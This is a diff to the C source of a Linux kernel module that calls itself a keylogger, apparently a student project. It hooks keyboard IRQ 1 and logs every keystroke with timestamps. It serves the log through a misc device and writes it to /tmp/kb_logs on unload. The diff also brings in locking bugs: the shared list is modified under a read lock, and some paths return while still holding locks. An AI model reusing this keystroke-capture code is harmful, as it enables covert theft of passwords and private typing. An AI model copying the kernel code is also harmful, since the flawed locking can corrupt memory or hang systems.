@@ -11,21 +11,9 @@
 #include <linux/fcntl.h>
 #include <linux/syscalls.h>
 
-#include <linux/kernel.h>
-#include <linux/init.h>
-#include <linux/module.h>
-#include <linux/syscalls.h>
-#include <linux/file.h>
-#include <linux/fs.h>
-#include <linux/fcntl.h>
-#include <asm/uaccess.h>
-
-#include <linux/kernel.h>
-#include <linux/module.h>
-#include <linux/fs.h>
 #include <asm/uaccess.h>
 #include <linux/mm.h>
-#include <linux/keyboard.h>
+#include <linux/delay.h>
 
 #include "struct.h"
 
@@ -33,23 +21,11 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Adam Taguirov <ataguiro@student.42.fr>");
 MODULE_DESCRIPTION("Keyboard interrupt handler");
 
-/*
-   static struct           s_stroke {
-   unsigned char   key;
-   unsigned char   state;
-   char            name[32];
-   char            value;
-   struct tm       time;
-   struct s_stroke *next;
-   };
-
-   static struct s_stroke *stroke_head = NULL;
-   */
-
 static char *read_buffer = NULL;
 static struct miscdevice kbhandler;
 static unsigned char sc;
 static void *my_data = NULL;
+static unsigned char destroy_request = 0;
 
 static unsigned char stop_interrupt = 0;
 
@@ -63,8 +39,11 @@ DECLARE_TASKLET(kbtask, got_char, (unsigned long)&sc);
  */
 
 DEFINE_RWLOCK(misc_lock);
+DEFINE_RWLOCK(open_lock);
 
-static struct mutex g_mutex;
+/*
+ * static struct mutex g_mutex;
+ */
 
 /*
  * rwlock_t array_lock = RW_LOCK_UNLOCKED;
@@ -119,12 +98,12 @@ static void got_char(unsigned long scancode_addr)
 	unsigned char scancode = *(char *)scancode_addr;
 
 	stop_interrupt = 1;
-	if (!(new = kmalloc(sizeof(struct s_stroke), GFP_ATOMIC)))
-		goto end;
 	if (scancode == 0xe0) {
 		multi = 1;
 		goto end;
 	}
+	if (!(new = kmalloc(sizeof(struct s_stroke), GFP_ATOMIC)))
+		goto end;
 	/*
 	 * Setting correct flags and states
 	 */
@@ -155,7 +134,7 @@ static void got_char(unsigned long scancode_addr)
 	/*
 	 * Saving new list node at correct place
 	 */
-	write_lock(&misc_lock);
+	read_lock(&misc_lock);
 	if (!stroke_head)
 		stroke_head = new;
 	else {
@@ -164,7 +143,7 @@ static void got_char(unsigned long scancode_addr)
 			tmp = tmp->next;
 		tmp->next = new;
 	}
-	write_unlock(&misc_lock);
+	read_unlock(&misc_lock);
 	multi = 0;
 end:
 	stop_interrupt = 0;
@@ -191,8 +170,16 @@ static void write_logs(void)
 
 	tmp = stroke_head;
 	f = file_open("/tmp/kb_logs", O_CREAT | O_WRONLY | O_APPEND, 0644);
-	if (!f)
+	if (!f) {
+		while (tmp) {
+			save = tmp->next;
+			kfree(tmp);
+			tmp = save;
+		}
+		stroke_head = NULL;
 		return ;
+	}
+	read_lock(&misc_lock);
 	while (tmp)
 	{
 		if (tmp->print == 1 && tmp->state == 1) {
@@ -204,6 +191,8 @@ static void write_logs(void)
 		kfree(tmp);
 		tmp = save;
 	}
+	stroke_head = NULL;
+	read_unlock(&misc_lock);
 	file_close(f);
 	printk("Letters statistics\n");
 	for (i = 0; i < 256; i++)
@@ -215,18 +204,22 @@ static int get_count(void)
 {
 	struct s_stroke *tmp;
 	char buf[256] = {0};
-	int ret = 0;
+	int ret = 0, check = 0;
 
 	tmp = stroke_head;
+	read_lock(&misc_lock);
 	while (tmp) {
-		snprintf(buf, 256, "[%d:%d:%d] %s (%s%#x) %s\n", \
+		check = snprintf(buf, 256, "[%d:%d:%d] %s (%s%#x) %s\n", \
 				tmp->time.tm_hour, tmp->time.tm_min, tmp->time.tm_sec, \
 				tmp->name, \
 				tmp->multi ? "0xe0, " : "", tmp->key, \
 				tmp->state ? "pressed" : "released");
+		if (check < 0)
+			return 0;
 		ret += strlen(buf);
 		tmp = tmp->next;
 	}
+	read_unlock(&misc_lock);
 	return ret;
 }
 
@@ -237,16 +230,14 @@ static int kbopen(struct inode *inode, struct file *f)
 	int n;
 	int ret = -EFAULT;
 
-	if (!f)
-		goto clean;
-	//ret = mutex_lock_interruptible(&g_mutex);
-	//if (ret)
-	//	goto clean;
+	if (!f || destroy_request)
+		goto end;
 	f->private_data = NULL;
 	tmp = stroke_head;
 	n = get_count();
 	if (!n)
 		goto nullcase;
+	read_lock(&open_lock);
 	if (read_buffer)
 		kfree(read_buffer);
 	read_buffer = kmalloc(n * sizeof(char), GFP_KERNEL);
@@ -255,14 +246,19 @@ static int kbopen(struct inode *inode, struct file *f)
 		goto end;
 	}
 	memset(read_buffer, 0, n * sizeof(char));
+	read_unlock(&open_lock);
 	read_lock(&misc_lock);
 	while (tmp) {
+		if (destroy_request)
+			return -EFAULT;
 		snprintf(buf, 256, "[%d:%d:%d] %s (%s%#x) %s\n", \
 				tmp->time.tm_hour, tmp->time.tm_min, tmp->time.tm_sec, \
 				tmp->name, \
 				tmp->multi ? "0xe0, " : "", tmp->key, \
 				tmp->state ? "pressed" : "released");
+		read_lock(&open_lock);
 		strcat(read_buffer, buf);
+		read_unlock(&open_lock);
 		tmp = tmp->next;
 	}
 	read_unlock(&misc_lock);
@@ -270,29 +266,21 @@ static int kbopen(struct inode *inode, struct file *f)
 nullcase:
 	ret = single_open(f, NULL, NULL);
 end:
-	//mutex_unlock(&g_mutex);
-clean:
 	return ret;
 }
 
 
 static ssize_t kbread(struct file *f, char __user *s, size_t n, loff_t *o)
 {
-	int ret = -EINVAL;
+	int ret = -EAGAIN;
 
-	if (!my_data || !s || !o) {
-		printk("null buffer\n");
+	if (!my_data || !s || !o || destroy_request)
 		goto clean;
-	}
-	//ret = mutex_lock_interruptible(&g_mutex);
-	//if (ret)
-	//	goto clean;
+	read_lock(&open_lock);
 	ret = simple_read_from_buffer(s, n, o, my_data, strlen(read_buffer));
-	//if (!ret) {
-	//	kfree(read_buffer);
-	//	read_buffer = NULL;
-	//}
-	//mutex_unlock(&g_mutex);
+	if (!ret)
+		my_data = NULL;
+	read_unlock(&open_lock);
 clean:
 	return ret;
 }
@@ -305,12 +293,12 @@ struct file_operations kbfops = {
 static int __init hello_init(void) {
 	int ret;
 
+	msleep(100);
 	printk(KERN_INFO "Keyboard keylogger initialized !\n");
-	mutex_init(&g_mutex);
 	kbhandler.minor = MISC_DYNAMIC_MINOR;
 	kbhandler.name = "kbhandler";
 	kbhandler.fops = &kbfops;
-	
+
 	if ((ret = misc_register(&kbhandler)))
 		goto end;
 	ret = request_irq (1, (irq_handler_t) irq_handler, IRQF_SHARED, "my_keyboard_driver", (void *)(irq_handler));
@@ -320,13 +308,14 @@ end:
 
 static void __exit hello_cleanup(void) {
 	printk(KERN_INFO "Destroying keylogger module.\n");
+	destroy_request = 1;
+	msleep(500);
 	write_logs();
 	if (read_buffer) {
 		kfree(read_buffer);
 		read_buffer = NULL;
 	}
 	misc_deregister(&kbhandler);
-	mutex_destroy(&g_mutex);
 	free_irq(1, (void *)(irq_handler));
 }
 
